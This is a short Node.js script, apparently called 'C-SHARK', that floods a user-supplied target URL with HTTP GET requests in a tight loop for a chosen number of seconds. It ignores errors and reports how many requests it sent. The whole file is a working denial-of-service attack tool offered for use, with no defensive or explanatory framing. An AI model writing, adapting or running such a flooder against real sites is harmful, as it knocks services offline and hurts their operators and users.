const axios = require('axios');

// Args: node attack.js <target_url> <time_in_seconds>
const [,, targetUrl, timeInSeconds] = process.argv;

if (!targetUrl || !timeInSeconds) {
  console.log('Usage: node attack.js <target_url> <time_in_seconds>');
  process.exit(1);
}

const durationMs = parseInt(timeInSeconds, 10) * 1000;
if (isNaN(durationMs) || durationMs <= 0) {
  console.log('Please provide a valid time in seconds.');
  process.exit(1);
}

let totalRequests = 0;

// Clear terminal and print start banner
console.clear();
console.log('C-SHARK! - ATTACK STARTED');

const startTime = Date.now();
const stopTime = startTime + durationMs;

// Continuous flooder
const flood = async () => {
  while (Date.now() < stopTime) {
    axios.get(targetUrl).catch(() => {}); // Ignore errors
    totalRequests++;
  }

  // After flood ends
  console.log('\nATTACK DONE');
  console.log('Total requests sent:', totalRequests);
};

flood();
